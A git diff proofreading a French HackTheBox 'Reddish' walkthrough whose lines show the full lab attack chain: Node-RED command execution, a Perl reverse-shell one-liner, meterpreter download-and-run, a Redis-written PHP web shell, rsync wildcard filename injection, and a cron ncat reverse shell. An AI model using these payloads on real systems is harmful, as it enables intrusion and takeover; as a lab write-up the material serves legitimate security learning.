@@ -6,22 +6,22 @@ tags: [CTF,HackTheBox]
 Unboxing
 --------
 
-*Reddish* est une machine Linux proposée sur HTB et créée par *yuntao*. 50 points viennent s'ajouter au score de ceux qui en viennent à boût, on peut donc s'attendre à une bonne difficulté.  
+*Reddish* est une machine Linux proposée sur HTB et créée par *yuntao*. 50 points viennent s'ajouter au score de ceux qui en viennent à bout, on peut donc s'attendre à une bonne difficulté.  
 
 Balance ton flow
 ----------------
 
-Un scan Nmap ne nous amène pas grand chose : tout juste un serveur web utilisant Node.  
+Un scan Nmap ne nous amène pas grand-chose : tout juste un serveur web utilisant Node.  
 
 ```
 1880/tcp open  http    Node.js Express framework
 ```
 
-Quand on se rend sur le site on obtient juste le message *Cannot GET /*.  
+Quand on se rend sur le site on obtient juste le message `Cannot GET /`.  
 
-Ok ok... qu'est-ce que tu nous propose alors ?  
+Ok ok... qu'est-ce que tu nous proposes alors ?  
 
-```
+```console
 $ curl -D- -X OPTIONS http://10.10.10.94:1880/
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -35,7 +35,7 @@ Connection: keep-alive
 
 Il suffisait de demander :) Va pour un petit POST  
 
-```
+```console
 $ curl -D- -X POST http://10.10.10.94:1880/
 HTTP/1.1 200 OK
 X-Powered-By: Express
@@ -48,21 +48,21 @@ Connection: keep-alive
 {"id":"8312251822ff2a9be87b835b6be13a11","ip":"::ffff:10.10.14.99","path":"/red/{id}"}
 ```
 
-On sait additionner 2 + 2 alors on en déduit qu'il faut se rendre sur */red/8312251822ff2a9be87b835b6be13a11* et on tombe sur un [Node-RED](https://nodered.org/) qui se définit comme un *Flow-based programming for the Internet of Things*.  
+On sait additionner 2 + 2 alors on en déduit qu'il faut se rendre sur `/red/8312251822ff2a9be87b835b6be13a11` et on tombe sur un [Node-RED](https://nodered.org/) qui se définit comme un *Flow-based programming for the Internet of Things*.  
 
 En gros sur la colonne de gauche vous avez une liste d'actions, événements, conditions, etc (qui sont baptisées *nodes*) que vous pouvez placer dans le graphe puis les relier entre eux pour définir un automate (oui on est en 2019 et j'ai dit automate :D ).  
 
 C'est plutôt fun à utiliser et ça peut être une bonne introduction à ceux qui souhaitent s'initier à la programmation.  
 
-Quoiqu'il en soit j'ai commencé à jouer avec cette interface qui m'était totalement inconnue et je suis par exemple parvenus à lire des fichiers présents sur le disque :  
+Quoi qu'il en soit j'ai commencé à jouer avec cette interface qui m'était totalement inconnue et je suis par exemple parvenus à lire des fichiers présents sur le disque :  
 
 ![HackTheBox Reddish CTF Node-RED file disclosure](/assets/img/htb/reddish/reddish_web.png)
 
-Ici l'action consiste à lire un fichier. Pour cela on prend l'icône marron *file* dans la section *storage*, on la place dans le graphe puis on double clique pour entrer le path du fichier (*/etc/passwd* dans mon exemple).  
+Ici l'action consiste à lire un fichier. Pour cela on prend l'icône marron *file* dans la section *storage*, on la place dans le graphe puis on double-clique pour entrer le path du fichier (`/etc/passwd` dans mon exemple).  
 
-On le relie alors à une sortie de type *tcp* où l'on rentre l'hôte et le port, on clique sur le bouton rouge *Deploy* et on reçoit ce qu'on attendait :  
+On le relie alors à une sortie de type `tcp` où l'on rentre l'hôte et le port, on clique sur le bouton rouge `Deploy` et on reçoit ce qu'on attendait :  
 
-```
+```console
 $ ncat -l -p 7777 -v
 Ncat: Version 7.70 ( https://nmap.org/ncat )
 Ncat: Listening on :::7777
@@ -94,7 +94,7 @@ systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
 node:x:1000:1000::/home/node:/bin/bash
 ```
 
-C'est un bon début mais ça ne nous amène malheureusement pas bien loin. Heureusement il y a une action *exec* qui sans trop de surprise permet d'exécuter des commandes du système (la colonne à droite donne les informations sur la *node* sélectionnée).  
+C'est un bon début, mais ça ne nous amène malheureusement pas bien loin. Heureusement il y a une action `exec` qui sans trop de surprise permet d'exécuter des commandes du système (la colonne à droite donne les informations sur la *node* sélectionnée).  
 
 J'ai un peu galéré à l'utiliser avant de comprendre que le déclencheur utilisé en début de chaîne n'était pas adapté. Il faut s'en remettre à la *node* baptisée *inject* qui est par défaut de type *timestamp*.  
 
@@ -102,19 +102,19 @@ L'avantage de cette *node* c'est que l'action se déclenche tout simplement quan
 
 Un timestamp est alors passé à la *node* suivante. Dans le cas de la node exec ce timestamp serait utilisé comme argument pour la commande choisie.  
 
-Il faut prendre soin dans les options d'*exec* de dire que l'on ne souhaite pas utiliser cette entrée (case à décocher, voir plus bas) et de définir nous même les arguments.  
+Il faut prendre soin dans les options d'`exec` de dire que l'on ne souhaite pas utiliser cette entrée (case à décocher, voir plus bas) et de définir nous même les arguments.  
 
-Après quelques essais peu concluants pour obtenir un reverse shell j'ai exploré un peu le système de fichier de la machine pour voir qu'il s'agissait d'un docker (fichier *.dockerenv* à la racine) très minimaliste (pas de *netcat* bien sûr mais pas non plus de Python, de curl ni de wget, argh...)  
+Après quelques essais peu concluants pour obtenir un reverse shell, j'ai exploré un peu le système de fichier de la machine pour voir qu'il s'agissait d'un docker (fichier `.dockerenv` à la racine) très minimaliste (pas de `netcat` bien sûr, mais pas non plus de `Python`, de `curl` ni de `wget`, argh...)  
 
-Tout juste un *Perl*... Allez il faut pas faire le difficile :D J'ai ressorti ce vieux [dc.pl](https://gist.github.com/islanddog/f5ad7636acf61fd963531ead7c784dc9) (je compte pas le nombre de machines que je lui ait fait visiter à une époque lointaine...) mais là encore grosse déception :  
+Tout juste un `Perl`... Allez, il ne faut pas faire le difficile :D J'ai ressorti ce vieux [dc.pl](https://gist.github.com/islanddog/f5ad7636acf61fd963531ead7c784dc9) (je ne compte pas le nombre de machines que je lui ai fait visiter à une époque lointaine...) mais là encore grosse déception :  
 
 ![HackTheBox Reddish CTF Node-RED Perl TCP FAIL](/assets/img/htb/reddish/reddish_perl_broken.png)
 
-Quoi ? *Unknown Protocol* ? técépé tu connais pas ? Argh c'est pas vrai !  
+Quoi ? `Unknown Protocol` ? técépé tu connais pas ? Argh, c'est pas vrai !  
 
 Du coup je suis reparti dans mes *nodes* à la recherche du *Graal* pour uploader un fichier.  
 
-Petite aparté, quand j'ai eu accès au système plus tard j'ai vu que certains étaient parvenu à obtenir leur reverse shell avec ce one-liner :  
+Petit aparté, quand j'ai eu accès au système plus tard j'ai vu que certains étaient parvenu à obtenir leur reverse shell avec ce one-liner :  
 
 ```bash
 perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.13.103:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
@@ -122,17 +122,17 @@ perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.13.103:
 
 Oui Perl ça pique les yeux :p  
 
-Finalement c'est ce download-execute en *Node-RED* qui a eu ma faveur :  
+Finalement, c'est ce download-execute en *Node-RED* qui a eu ma faveur :  
 
 ![HackTheBox Reddish CTF Node-RED download execute](/assets/img/htb/reddish/reddish_download_execute.png)
 
 ![HackTheBox Reddish CTF Node-RED exec node](/assets/img/htb/reddish/reddish_exec.png)
 
-Il télécharge un *Meterpreter* (généré via *msfvenom -p linux/x64/meterpreter\_reverse\_tcp LHOST=10.10.14.99 LPORT=7777 -f elf -o devloop.bin*) sur mon serveur web (il faut indiquer dans la node que l'on souhaite en sortie un buffer et non une chaîne de caractères UTF-8) et l'écrit à l'emplacement de notre choix.  
+Il télécharge un *Meterpreter* (généré via `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.10.14.99 LPORT=7777 -f elf -o devloop.bin`) sur mon serveur web (il faut indiquer dans la node que l'on souhaite en sortie un buffer et non une chaîne de caractères UTF-8) et l'écrit à l'emplacement de notre choix.  
 
-Ensuite j'appelle *exec* sur */bin/sh* avec les arguments *-c "chmod +x /tmp/devloop.bin; /tmp/devloop.bin &"*.  
+Ensuite j'appelle `exec` sur `/bin/sh` avec les arguments `-c "chmod +x /tmp/devloop.bin; /tmp/devloop.bin &"`.  
 
-On obtient alors notre session *Meterpreter* et on n'est qu'au début d'un looooog voyage :)  
+On obtient alors notre session *Meterpreter* et on n'est qu'au début d'un looooong voyage :)  
 
 ```
 meterpreter > ifconfig
@@ -172,12 +172,12 @@ Plus d'infos sur l'exploitation Docker peuvent être trouvées dans [ces slides 
 Redis de perdu, 10 de retrouvés
 -------------------------------
 
-Pour trouver les autres containers on va scanner les réseaux accessibles. Uploader Nmap et toutes ses dépendances ça semble plutôt compliqué (*ldd nmap* pour rigoler) heureusement il y a [ce répo Github](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) qui propose différents outils compilés statiquement (et déjà strippés s'il vous plait).  
+Pour trouver les autres containers on va scanner les réseaux accessibles. Uploader Nmap et toutes ses dépendances ça semble plutôt compliqué (`ldd nmap` pour rigoler) heureusement il y a [ce répo Github](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) qui propose différents outils compilés statiquement (et déjà strippés s'il vous plait).  
 
-Une fois uploadé Nmap se plaignait de l'absence du fichier *nmap-services* : même punition, upload dans le même dossier et ça fonctionne :)  
+Une fois uploadé Nmap se plaignait de l'absence du fichier `nmap-services` : même punition, upload dans le même dossier et ça fonctionne :)  
 
-```
-./nmap -sT -T5 -p1-65535 -oA devloop --open 172.19.0.0/16
+```console
+$ ./nmap -sT -T5 -p1-65535 -oA devloop --open 172.19.0.0/16
 
 Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-01-14 20:08 UTC
 Cannot find nmap-payloads. UDP payloads are disabled.
@@ -197,18 +197,18 @@ PORT   STATE SERVICE
 MAC Address: 02:42:AC:13:00:03 (Unknown)
 ```
 
-On s'empresse de port-forwarder ces deux ports depuis notre session Meterpreter (cela permet d'avoir les ports directements accessibles sur 127.0.0.1, Meterpreter fait le reste).  
+On s'empresse de port-forwarder ces deux ports depuis notre session _Meterpreter_ (cela permet d'avoir les ports directement accessibles sur 127.0.0.1, _Meterpreter_ fait le reste).  
 
-```
+```bash
 portfwd add -l 6379 -p 6379 -r 172.19.0.2
 portfwd add -l 80 -p 80 -r 172.19.0.3
 ```
 
-Sur le port 80 on ne trouve pas grand chose : juste une install par défaut avec le message *It works!*  
+Sur le port 80 on ne trouve pas grand-chose : juste une install par défaut avec le message *It works!*  
 
-Pour le Redis c'est plus intéressant. Certes si on effectue un *searchsploit redis* depuis Kali on ne trouve rien d'exceptionnel pourtant il existe des techniques permettant d'exploiter un Redis exposé sans authentification.  
+Pour le Redis, c'est plus intéressant. Certes si on effectue un `searchsploit redis` depuis Kali on ne trouve rien d'exceptionnel pourtant il existe des techniques permettant d'exploiter un Redis exposé sans authentification.  
 
-Metasploit dispose d'un module *auxiliary/scanner/redis/file\_upload* dont la description est assez parlante :  
+Metasploit dispose d'un module `auxiliary/scanner/redis/file_upload` dont la description est assez parlante :  
 
 ```
 Description:
@@ -220,9 +220,9 @@ Description:
   database on disk.
 ```
 
-L'exploitation peut aussi se faire plus simplement en se connectant sur le port Redis à l'aide de telnet (qui s’occupera d'envoyer des CRLF). On peut voir plusieurs scénarios d'explotation sur le blog de [Urahara](http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html).  
+L'exploitation peut aussi se faire plus simplement en se connectant sur le port Redis à l'aide de telnet (qui s’occupera d'envoyer des CRLF). On peut voir plusieurs scénarios d'exploitation sur le blog de [Urahara](http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html).  
 
-Le client redis semble lui utiliser un formatage légèrement plus poussé, assez propre du bencoding utilisé par Bittorent, dans tous les cas il est assez simple d'écrire à titre d'exemple un outil de brute-force de compte Unix pour espérer trouver un dossier .ssh accessible :  
+Le client redis semble lui utiliser un formatage légèrement plus poussé, assez propre du bencoding utilisé par Bittorent, dans tous les cas il est assez simple d'écrire à titre d'exemple un outil de brute-force de compte Unix pour espérer trouver un dossier `.ssh` accessible :  
 
 ```python
 import socket
@@ -258,18 +258,18 @@ with open(sys.argv[1], errors="ignore") as fd:
 sock.close()
 ```
 
-Malheureusement pas de serveur SSH accessible ici, l’intérêt est donc très limité. En revanche la présence du serveur web nous incite à tester l'autre scénario consistant à écrire du code PHP sous la racine web */var/www/html*.  
+Malheureusement pas de serveur SSH accessible ici, l’intérêt est donc très limité. En revanche la présence du serveur web nous incite à tester l'autre scénario consistant à écrire du code PHP sous la racine web `/var/www/html`.  
 
-Pour celà on envoie les commandes suivantes au Redis :  
+Pour cela on envoie les commandes suivantes au Redis :  
 
-```
+```bash
 config set dir /var/www/html
 set dbfilename devloop.php
 set payload "<?php system($_GET['cmd']); ?>
 save
 ```
 
-A noter que payload est un nom de clé pris pour l'exemple, on peut mettre ce que l'on veut. Le Redis acquiesce sans broncher (série de réponses OK) puis on obtient finalement notre shell.  
+À noter que `payload` est un nom de clé pris pour l'exemple, on peut mettre ce que l'on veut. Le Redis acquiesce sans broncher (série de réponses `OK`) puis on obtient finalement notre shell.  
 
 ![HackTheBox Reddish CTF Redis exploitation leading to PHP backdoor](/assets/img/htb/reddish/reddish_www_container.png)
 
@@ -278,9 +278,9 @@ J'ai toutefois noté deux problèmes récurrents :
 * L'existence d'autres clés/valeurs dans le Redis peut mener à un fichier PHP avec des problèmes d'encodage qui ne sera alors pas interprété :(
 * Une tâche semble supprimer le fichier uploadé rapidement
 
-Pour régler le premier problème j'ai mis un commentaire ouvrant à la fin de mon script PHP et omis de le fermer (tout comme le tag PHP). PHP est en effet assez permissif, il faillait exploiter l'une de ces caractéristiques pour résoudre [le CTF Homeless]({% link _posts/2018-02-23-Solution-du-CTF-Homeless-de-VulnHub.md %}).  
+Pour régler le premier problème, j'ai mis un commentaire ouvrant à la fin de mon script PHP et omis de le fermer (tout comme le tag PHP). PHP est en effet assez permissif, il faillait exploiter l'une de ces caractéristiques pour résoudre [le CTF Homeless]({% link _posts/2018-02-23-Solution-du-CTF-Homeless-de-VulnHub.md %}).  
 
-Pour le second problème j'ai vu que les dotfiles ne semblent pas supprimées par la tache, il suffit donc de préfixer notre nom de fichier par un point.  
+Pour le second problème, j'ai vu que les dotfiles ne semblent pas supprimées par la tache, il suffit donc de préfixer notre nom de fichier par un point.  
 
 Sur cette machine où l'on dispose de droits restreints (www-data) on peut voir les dossiers personnels de deux utilisateurs du système :  
 
@@ -315,7 +315,7 @@ lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -> /dev/null
 
 Le flag ne nous est malheureusement pas accessible :'(  
 
-On trouve en revanche un script */backup/backup.sh* plus intéressant car exploitable via l'utilisation d'astérisque non protégés :  
+On trouve en revanche un script `/backup/backup.sh` plus intéressant, car exploitable via l'utilisation d'astérisques non protégés :  
 
 ```bash
 cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
@@ -327,11 +327,11 @@ chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
 
 [Ce document](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) indique comment on peut exploiter la première commande rsync en créant deux fichiers.  
 
-Le premier sera nommé *-e sh devloop.rdb* et sera vide, ce sera lui qui s'injectera dans la commande rsync.  
+Le premier sera nommé `-e sh devloop.rdb` et sera vide, ce sera lui qui s'injectera dans la commande rsync.  
 
-le second devra être nommé *devloop.rdb* et contiendra la commande que l'on souhaite faire exécuter.  
+Le second devra être nommé `devloop.rdb` et contiendra la commande que l'on souhaite faire exécuter.  
 
-J'ai préféré automatiser toute cette partie de l'exploitation car ça commence à faire beaucoup de commandes et donc beaucoup de temps à passer...  
+J'ai préféré automatiser toute cette partie de l'exploitation, car ça commence à faire beaucoup de commandes et donc beaucoup de temps à passer...  
 
 Voici l'une des premières versions du script :  
 
@@ -399,7 +399,7 @@ response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("ls -al /var/ww
 print(response.text)
 ```
 
-Ce script copie un netcat sous forme encodée (base64) vers */tmp* et insère la commande permettant de nous envoyer un reverse shell dans le fichier *rdb* (il faut donc avoir préalablement mis en écoute un ncat/netcat sur le container *Node* de tout à l'heure).  
+Ce script copie un `netcat` sous forme encodée (base64) vers `/tmp` et insère la commande permettant de nous envoyer un reverse shell dans le fichier `rdb` (il faut donc avoir préalablement mis en écoute un ncat/netcat sur le container *Node* de tout à l'heure).  
 
 On attend un peu que le script de backup soit exécuté :  
 
@@ -412,14 +412,14 @@ hostname
 www
 ```
 
-Cool, maintenant on est root sur le container www ce qui nous permet d'accéder au flag de l'utilisateur *somaro* (c09aca7cb02... ) :)  
+Cool, maintenant on est root sur le container `www` ce qui nous permet d'accéder au flag de l'utilisateur `somaro` (`c09aca7cb02...`) :)  
 
 Bitterish
 ---------
 
 Maintenant que l'on est root on peut explorer plus en détails le système, en particulier voir les interfaces réseau.  
 
-Vu que *ifconfig* n'est pas présent sur le système et qu'on ne dispose pas ici d'un *Meterpreter* j'ai placé le script d'upload suivant sur le système :  
+Vu que `ifconfig` n'est pas présent sur le système et qu'on ne dispose pas ici d'un *Meterpreter* j'ai placé le script d'upload suivant sur le système :  
 
 ```php
 <?php
@@ -441,7 +441,7 @@ Je peux alors m'envoyer les binaires manquant de cette façon via le tunnel cré
 curl -F "uploaded_file=@/sbin/ifconfig"  http://127.0.0.1/.devloop_upload.php
 ```
 
-Pour les gros binaires statiques il aura fallu les compresser au préalable avec xz sans quoi le script d'upload échoue.  
+Pour les gros binaires statiques, il aura fallu les compresser au préalable avec `xz` sans quoi le script d'upload échoue.  
 
 On découvre alors un nouveau réseau en 120.20 :  
 
@@ -471,7 +471,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-On envoie à nouveau un Nmap et on recommence. On n'est pas trop surpris de voir un serveur rsync :  
+On envoie à nouveau un _Nmap_ et on recommence. On n'est pas trop surpris de voir un serveur rsync :  
 
 ```
 Nmap scan report for reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)
@@ -490,9 +490,9 @@ PORT      STATE    SERVICE
 MAC Address: 02:42:AC:14:00:02 (Unknown)
 ```
 
-Via rsync on peut donc lire les fichiers présents sur le système mais on n'y trouve rien d'intéressant (le flag *root.txt* n'est pas présent).  
+Via rsync on peut donc lire les fichiers présents sur le système, mais on n'y trouve rien d'intéressant (le flag `root.txt` n'est pas présent).  
 
-```
+```console
 $ rsync rsync://backup:873/
 src             src path
 
@@ -527,9 +527,9 @@ $ rsync rsync://backup:873/src/var/spool/cron/crontabs/
 drwx-wx--T          4,096 2018/07/15 17:42:39 .
 ```
 
-Le rsync nous permet aussi de déposer des fichiers sur la machine *backup* par conséquent notre plan d'attaque consiste à uploader d'abord un *ncat* statique et ensuite ajouter une crontab qui nous envoie un reverse shell.  
+Le rsync nous permet aussi de déposer des fichiers sur la machine `backup` par conséquent notre plan d'attaque consiste à uploader d'abord un `ncat` statique et ensuite ajouter une crontab qui nous envoie un reverse shell.  
 
-Voici les commandes que j'ai tapé :  
+Voici les commandes que j'ai tapées :  
 
 ```bash
 echo "*/1 * * * * touch /tmp/yolo & /bin/ncat -e /bin/sh 172.20.0.3 9999" > root
@@ -539,9 +539,9 @@ rsync -a ncat rsync://backup:873/src/bin/
 rsync -a root rsync://backup:873/src/var/spool/cron/crontabs/
 ```
 
-Maintenant c'est compliqué de gérer dans le même shell sur le container *www* l'exploitation et la réception du reverse shell, en particulier parce que si le reverse shell ne vient pas on va avoir du mal à stopper notre listener ncat sans tout couper et tout perdre (ou presque) :D (le shell est très basique, pas de pty).  
+Maintenant, c'est compliqué de gérer dans le même shell sur le container `www` l'exploitation et la réception du reverse shell, en particulier parce que si le reverse shell ne vient pas on va avoir du mal à stopper notre listener `ncat` sans tout couper et tout perdre (ou presque) :D (le shell est très basique, pas de pty).  
 
-Par conséquent le listener *ncat* ne sera pas lancé sur le docker *www* mais sur *nodered* (le premier). Sur *www* on exécutera un socat qui fera une redirection de port :  
+Par conséquent, le listener `ncat` ne sera pas lancé sur le docker `www` mais sur `nodered` (le premier). Sur `www` on exécutera un `socat` qui fera une redirection de port :  
 
 ```bash
 ./socat TCP-LISTEN:9999,fork,reuseaddr TCP:172.19.0.4:9999 &
@@ -549,7 +549,7 @@ Par conséquent le listener *ncat* ne sera pas lancé sur le docker *www* mais s
 
 Cette commande est du coup à placer avant l'exécution rsync ;-)   
 
-Cette fois on le tient notre accès root sur le dernier container :  
+Cette fois, on le tient notre accès root sur le dernier container :  
 
 ```
 Ncat: Connection from 172.19.0.3.
@@ -570,15 +570,15 @@ drwxr-xr-x 1 root root 4096 Jul 15  2018 ..
 
 Sh\*t toujours pas de flag root :'(   
 
-L'exploration du système a été très particulière puisque à ce stade je dispose d'une unique session *Meterpreter* avec deux channels : l'un sur *www* et l'autre sur *backup*.  
+L'exploration du système a été très particulière puisqu'à ce stade, je dispose d'une unique session *Meterpreter* avec deux channels : l'un sur `www` et l'autre sur `backup`.  
 
-Il aura fallut switcher en permanence de l'un à l'autre : utiliser rsync depuis *www* pour envoyer les commandes manquantes et autres scripts vers *backup* puis switcher sur *backup* pour réceptionner les scripts et les exécuter.  
+Il aura fallu switcher en permanence de l'un à l'autre : utiliser rsync depuis `www` pour envoyer les commandes manquantes et autres scripts vers `backup` puis switcher sur `backup` pour réceptionner les scripts et les exécuter.  
 
 [LinEnum](https://github.com/rebootuser/LinEnum) ne m'a rien remonté que je savais déjà (Hé on est sur un container Docker !)  
 
 Je m'en suis remis aux conseils de [r0pSteev](https://twitter.com/stevenaathan4) qui invitaient à se pencher sur les partitions du système.  
 
-```
+```console
 $ lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINT,LABEL
 NAME   FSTYPE  SIZE MOUNTPOINT LABEL
 sda             18G
@@ -592,9 +592,9 @@ sr0           1024M
 
 Et effectivement :  
 
-```
-mount -t ext4 /dev/sda1 /mnt
-ls -l /mnt
+```console
+$ mount -t ext4 /dev/sda1 /mnt
+$ ls -l /mnt
 total 104
 drwxr-xr-x  2 root root  4096 Jul 16  2018 bin
 drwxr-xr-x  2 root root  4096 Jul 15  2018 boot
@@ -621,9 +621,9 @@ drwxr-xr-x 10 root root  4096 Jul 15  2018 usr
 drwxr-xr-x 13 root root  4096 Jul 15  2018 var
 lrwxrwxrwx  1 root root    30 Jul 16  2018 vmlinuz -&gt; boot/vmlinuz-4.4.0-130-generic
 lrwxrwxrwx  1 root root    30 Apr 20  2018 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-119-generic
-ls /mnt/root
+$ ls /mnt/root
 root.txt
-cat /mnt/root/root.txt
+$ cat /mnt/root/root.txt
 50d0db6 -- snip --17c2ed205
 ```
 
@@ -636,10 +636,10 @@ J'ai essayé de reconstituer un graphe des attaques en utilisant [Cacoo](https:/
 
 ![HackTheBox Reddish CTF attach graph](/assets/img/htb/reddish/reddish_graph.png)
 
-Ce qui fait de ce CTF un vrai casse-tête ce sont clairement les difficultés à devoir pivoter et reverse-pivoter d'une machine à une autre. A ce sujet il existe quelques outils mais tous semblent manquer une fonctionnalité *reverse* (à moins d'être en mesure d'utiliser SSH). Une lacune que j'espère voire comblée :)   
+Ce qui fait de ce CTF un vrai casse-tête ce sont clairement les difficultés à devoir pivoter et reverse-pivoter d'une machine à une autre. À ce sujet, il existe quelques outils, mais tous semblent manquer une fonctionnalité *reverse* (à moins d'être en mesure d'utiliser SSH). Une lacune que j'espère voire comblée :)   
 
 Le tout était d'autant plus compliqué que d'un reset de la box à un autre les adresses IPs des containers pouvaient changer sensiblement :|   
 
-Un peu sur ma fin pour la fin du CTF, j'attend de voir les writeups des autres participants pour savoir s'il y avait un indice particulier pour les partitions.
+Un peu sur ma fin pour la fin du CTF, j'attends de voir les writeups des autres participants pour savoir s'il y avait un indice particulier pour les partitions.
 
 *Published January 26 2019 at 17:48*
